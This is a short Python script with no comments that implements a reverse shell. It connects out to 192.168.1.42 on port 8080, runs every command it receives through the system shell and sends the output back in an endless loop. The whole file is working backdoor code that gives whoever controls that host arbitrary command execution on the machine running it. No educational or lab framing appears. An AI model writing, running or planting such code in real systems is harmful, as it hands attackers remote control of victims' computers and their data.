import socket
import subprocess
import optparse as op

def command_execution(command):
    return subprocess.check_output(command, shell=True)

my_connection  = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
my_connection.connect(('192.168.1.42', 8080));

while True:
    command = my_connection.recv(1024);
    command_output = command_execution(command)

    my_connection.send(command_output);   
my_connection.close();
